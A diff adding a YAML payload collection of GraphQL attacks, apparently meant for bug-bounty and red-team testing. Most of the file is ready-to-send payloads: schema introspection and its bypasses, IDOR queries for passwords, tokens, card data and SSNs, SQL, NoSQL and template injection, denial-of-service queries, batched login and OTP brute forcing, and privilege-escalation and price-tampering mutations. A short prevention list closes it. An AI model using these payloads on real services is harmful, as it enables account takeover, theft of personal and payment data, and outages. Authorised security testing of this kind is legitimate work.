@@ -1,0 +1,129 @@
+# GraphQL Injection & Abuse Payloads
+# Real-world GraphQL attack vectors used in bug bounties and red team engagements
+
+payload_category: "graphql"
+owasp_2025: "A05"
+cwe: "CWE-200"
+severity: "HIGH"
+
+# ===== INTROSPECTION (First thing a red teamer does) =====
+introspection:
+  full_schema:
+    - '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}'
+    - '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}'
+    - '{"query":"{ __schema { types { name kind description fields { name args { name type { name } } } } } }"}'
+
+  type_enumeration:
+    - '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}'
+    - '{"query":"{ __type(name: \"Admin\") { name fields { name type { name } } } }"}'
+    - '{"query":"{ __type(name: \"Query\") { fields { name args { name type { name } } } } }"}'
+    - '{"query":"{ __type(name: \"Mutation\") { fields { name args { name type { name } } } } }"}'
+
+  introspection_bypass:
+    - '{"query":"query { __schema { queryType { name } } }"}'
+    - '{"query":"query IntrospectionQuery { __schema { types { name } } }"}'
+    - '{"query":"{ __typename }"}'
+    - '{"operationName":"IntrospectionQuery","query":"query IntrospectionQuery{__schema{types{name}}}"}'
+    - '{"query":"{__schema{types{name,fields{name}}}}"}'
+
+# ===== AUTHORIZATION BYPASS (The money shot) =====
+auth_bypass:
+  idor_via_graphql:
+    - '{"query":"{ user(id: 1) { email password role } }"}'
+    - '{"query":"{ user(id: 2) { email apiKey secretToken } }"}'
+    - '{"query":"{ users { id email role isAdmin } }"}'
+    - '{"query":"mutation { updateUser(id: 2, role: \"admin\") { id role } }"}'
+    - '{"query":"mutation { deleteUser(id: 2) { success } }"}'
+
+  field_suggestion_abuse:
+    - '{"query":"{ user { id email passwor } }"}'
+    - '{"query":"{ user { id email secre } }"}'
+    - '{"query":"{ user { id email toke } }"}'
+    note: "Intentional typos trigger field suggestions revealing hidden fields"
+
+  nested_object_access:
+    - '{"query":"{ user(id: 1) { orders { paymentDetails { cardNumber cvv } } } }"}'
+    - '{"query":"{ user(id: 1) { profile { ssn dateOfBirth address } } }"}'
+    - '{"query":"{ user(id: 1) { sessions { token ipAddress } } }"}'
+
+# ===== INJECTION THROUGH GRAPHQL =====
+injection:
+  sqli_via_args:
+    - '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id email } }"}'
+    - '{"query":"{ search(term: \"\\\" UNION SELECT username,password FROM users--\") { results } }"}'
+    - '{"query":"{ user(id: \"1 OR 1=1\") { email } }"}'
+
+  nosql_via_args:
+    - '{"query":"{ login(username: {\"$ne\": \"\"}, password: {\"$ne\": \"\"}) { token } }"}'
+
+  ssti_via_args:
+    - '{"query":"{ render(template: \"{{7*7}}\") { output } }"}'
+    - '{"query":"{ user(name: \"${7*7}\") { id } }"}'
+
+# ===== DENIAL OF SERVICE =====
+dos:
+  deep_nesting:
+    - '{"query":"{ users { friends { friends { friends { friends { friends { id } } } } } } }"}'
+    - '{"query":"{ a: __typename b: __typename c: __typename d: __typename e: __typename f: __typename g: __typename h: __typename i: __typename j: __typename }"}'
+
+  batch_query:
+    - '[{"query":"{ user(id:1){email}"},{"query":"{ user(id:2){email}"},{"query":"{ user(id:3){email}"},{"query":"{ user(id:4){email}"},{"query":"{ user(id:5){email}"}]'
+
+  field_duplication:
+    - '{"query":"{ users { id id id id id id id id id id id id id id id id id id id id email email email email email } }"}'
+
+  circular_fragments:
+    - '{"query":"{ ...A } fragment A on Query { ...B } fragment B on Query { ...A }"}'
+
+  resource_exhaustion:
+    - '{"query":"{ users(first: 999999) { id email password } }"}'
+    - '{"query":"{ search(term: \"*\", limit: 999999) { id } }"}'
+
+# ===== BATCHING ATTACKS =====
+batching:
+  brute_force_login:
+    - '[{"query":"mutation{login(u:\"admin\",p:\"pass1\"){token}}"},{"query":"mutation{login(u:\"admin\",p:\"pass2\"){token}}"},{"query":"mutation{login(u:\"admin\",p:\"pass3\"){token}}"}]'
+    note: "Bypass rate limiting by batching login attempts in single request"
+
+  otp_brute:
+    - '[{"query":"mutation{verifyOTP(code:\"0000\"){s}}"},{"query":"mutation{verifyOTP(code:\"0001\"){s}}"},{"query":"mutation{verifyOTP(code:\"0002\"){s}}"}]'
+
+# ===== MUTATION ABUSE =====
+mutations:
+  privilege_escalation:
+    - '{"query":"mutation { updateProfile(role: \"admin\") { id role } }"}'
+    - '{"query":"mutation { setPermissions(userId: 1, permissions: [\"admin\"]) { success } }"}'
+
+  mass_assignment:
+    - '{"query":"mutation { createUser(input: {name: \"test\", email: \"test@test.com\", role: \"admin\", isVerified: true}) { id } }"}'
+
+  data_manipulation:
+    - '{"query":"mutation { updatePrice(productId: 1, price: 0.01) { id price } }"}'
+    - '{"query":"mutation { applyCoupon(code: \"INVALID\", discount: 100) { total } }"}'
+
+# ===== INFORMATION DISCLOSURE =====
+info_disclosure:
+  debug_mode:
+    - '{"query":"{ __schema { directives { name description locations args { name } } } }"}'
+    - '{"query":"INVALID QUERY TO TRIGGER VERBOSE ERROR"}'
+    - '{"query":""}'
+
+  websocket_subscription:
+    - '{"type":"connection_init","payload":{"Authorization":""}}'
+    - '{"type":"start","id":"1","payload":{"query":"subscription { newMessages { id content sender { email } } }"}}'
+
+prevention:
+  - "Disable introspection in production"
+  - "Implement field-level authorization"
+  - "Set query depth limits (max 7-10)"
+  - "Set query complexity limits"
+  - "Disable batching or rate-limit per batch"
+  - "Validate and sanitize all input arguments"
+  - "Use persisted queries in production"
+  - "Implement proper cost analysis"
+
+references:
+  - "OWASP GraphQL Cheat Sheet"
+  - "HackTricks: GraphQL"
+  - "PayloadsAllTheThings: GraphQL Injection"
+  - "graphql-cop: GraphQL security auditing"
